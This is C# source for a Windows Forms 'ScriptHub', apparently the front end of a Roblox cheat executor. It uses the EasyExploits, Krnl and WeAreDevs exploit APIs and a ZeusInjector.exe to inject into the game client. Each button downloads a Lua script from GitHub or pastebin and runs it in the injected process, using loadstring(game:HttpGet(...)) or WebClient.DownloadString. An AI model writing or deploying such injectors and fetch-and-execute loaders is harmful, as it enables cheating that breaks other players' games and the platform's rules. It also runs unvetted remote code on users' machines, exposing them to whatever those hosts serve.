﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using EasyExploits;
using System.Net;
using KrnlAPI;
using WeAreDevs_API;

namespace T4N
{
    public partial class ScriptHub : Form
    {
        EasyExploits.Module T4N = new EasyExploits.Module();
        ExploitAPI api = new ExploitAPI();
        WebClient wb = new WebClient();
        public ScriptHub()
        {
            InitializeComponent();
            MainAPI.Load();
        }

        private void bunifuFlatButton4_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void bunifuFlatButton3_Click(object sender, EventArgs e)
        {
            this.Hide();
        }


        private void bunifuFlatButton1_Click(object sender, EventArgs e)
        {
            if (API_Easy_Radio.Checked == true)
            {
                T4N.LaunchExploit();
            }
            else if (ZeusRadio.Checked == true)
            {
                Process.Start("ZeusInjector.exe");
            }
            else if (KrnlRadio.Checked == true)
            {
                MainAPI.Inject();
            }
            else if (WRDRadio.Checked == true)
            {
                api.LaunchExploit();
            }
        }

        private void bunifuFlatButton2_Click(object sender, EventArgs e)
        {
            if (API_Easy_Radio.Checked == true)
            {
                T4N.ExecuteScript("loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()");
            }
            else if (ZeusRadio.Checked == true)
            {
                NamedPipes.LuaPipe("loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()");
            }
            else if (KrnlRadio.Checked == true)
            {
                MainAPI.Execute("loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()");
            }
            else if (WRDRadio.Checked == true)
            {
                api.SendLuaScript("loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()");
            }

        }

        private void bunifuFlatButton5_Click(object sender, EventArgs e)
        {
            if (API_Easy_Radio.Checked == true)
            {
                string Script = wb.DownloadString("https://pastebin.com/raw/hdfAEgb9");
                T4N.ExecuteScript(Script);
            }
            else if (ZeusRadio.Checked == true)
            {
                string Script = wb.DownloadString("https://pastebin.com/raw/hdfAEgb9");
                NamedPipes.LuaPipe(Script);
            }
            else if (KrnlRadio.Checked == true)
            {
                string Script = wb.DownloadString("https://pastebin.com/raw/hdfAEgb9");
                MainAPI.Execute(Script);
            }
            else if (WRDRadio.Checked == true)
            {
                string Script = wb.DownloadString("https://pastebin.com/raw/hdfAEgb9");
                api.SendLuaScript(Script);
            }


        }

        private void bunifuFlatButton6_Click(object sender, EventArgs e)
        {
            if (API_Easy_Radio.Checked == true)
            {
                string Script = wb.DownloadString("https://pastebin.com/raw/s1a9Liwu");
                T4N.ExecuteScript(Script);
            }
            else if (ZeusRadio.Checked == true)
            {
                string Script = wb.DownloadString("https://pastebin.com/raw/s1a9Liwu");
                NamedPipes.LuaPipe(Script);
            }
            else if (KrnlRadio.Checked == true)
            {
                string Script = wb.DownloadString("https://pastebin.com/raw/s1a9Liwu");
                MainAPI.Execute(Script);
            }
            else if (WRDRadio.Checked == true)
            {
                string Script = wb.DownloadString("https://pastebin.com/raw/s1a9Liwu");
                api.SendLuaScript(Script);
            }

        }

        private void bunifuFlatButton7_Click(object sender, EventArgs e)
        {
            if (API_Easy_Radio.Checked == true)
            {
                string Script = wb.DownloadString("https://pastebin.com/raw/hqVcXA1j");
                T4N.ExecuteScript(Script);
            }
            else if (ZeusRadio.Checked == true)
            {
                string Script = wb.DownloadString("https://pastebin.com/raw/hqVcXA1j");
                NamedPipes.LuaPipe(Script);
            }
            else if (KrnlRadio.Checked == true)
            {
                string Script = wb.DownloadString("https://pastebin.com/raw/hqVcXA1j");
                MainAPI.Execute(Script);
            }
            else if (WRDRadio.Checked == true)
            {
                string Script = wb.DownloadString("https://pastebin.com/raw/hqVcXA1j");
                api.SendLuaScript(Script);
            }


        }

        private void ScriptHub_Load(object sender, EventArgs e)
        {

        }
        Point lastPoint;
        private void panel1_MouseDown(object sender, MouseEventArgs e)
        {
            lastPoint = new Point(e.X, e.Y);
        }

        private void panel1_MouseMove(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                this.Left += e.X - lastPoint.X;
                this.Top += e.Y - lastPoint.Y;
            }
        }

        private void bunifuFlatButton8_Click(object sender, EventArgs e)
        {
            if (API_Easy_Radio.Checked == true)
            {
                string Script = wb.DownloadString("https://pastebin.com/raw/31VS1wL0");
                T4N.ExecuteScript(Script);
            }
            else if (ZeusRadio.Checked == true)
            {
                string Script = wb.DownloadString("https://pastebin.com/raw/31VS1wL0");
                NamedPipes.LuaPipe(Script);
            }
            else if (KrnlRadio.Checked == true)
            {
                string Script = wb.DownloadString("https://pastebin.com/raw/31VS1wL0");
                MainAPI.Execute(Script);
            }
            else if (WRDRadio.Checked == true)
            {
                string Script = wb.DownloadString("https://pastebin.com/raw/31VS1wL0");
                api.SendLuaScript(Script);
            }
        }
    }
}
